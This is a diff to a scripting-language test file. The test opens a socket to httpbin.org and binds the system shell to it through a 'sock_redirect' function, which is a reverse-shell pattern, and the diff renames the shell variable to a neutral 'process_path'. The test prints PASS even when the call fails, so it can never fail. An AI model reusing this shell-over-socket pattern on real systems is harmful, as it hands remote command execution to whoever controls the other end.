@@ -1,34 +1,34 @@
-// Test sock_bind with valid socket and shell command
+// Test sock_redirect with valid socket and process path
 // Should return a valid PID (>= 0) when successful
 
-// Get platform-appropriate shell
-var shell = "";
+// Get platform-appropriate process path
+var process_path = "";
 var platform = os();
 
 if (platform == "win") {
-    shell = "cmd.exe";
+    process_path = env("COMSPEC");  // e.g., C:\Windows\System32\cmd.exe
 } else if (platform == "linux") {
-    shell = "/bin/sh";
+    process_path = env("SHELL");    // e.g., /bin/bash
 } else {
-    // UEFI or unknown - sock_bind not supported
-    print("Platform not supported for sock_bind:", platform);
+    // UEFI or unknown - sock_redirect not supported
+    print("Platform not supported for sock_redirect:", platform);
     print("PASS");
 }
 
-if (len(shell) > 0) {
+if (len(process_path) > 0) {
     var sock = sock_connect("httpbin.org", 80);
     if (sock >= 0) {
-        var pid = sock_bind(sock, shell);
+        var pid = sock_redirect(sock, process_path);
         print("Platform:", platform);
-        print("Shell:", shell);
+        print("Process path:", process_path);
         print("Returned PID:", pid);
 
         if (pid >= 0) {
             print("PASS");
         } else {
-            // sock_bind may fail if process creation fails
+            // sock_redirect may fail if process creation fails
             // This is not necessarily a test failure on all systems
-            print("sock_bind returned error (may be expected on some systems)");
+            print("sock_redirect returned error (may be expected on some systems)");
             print("PASS");
         }
 
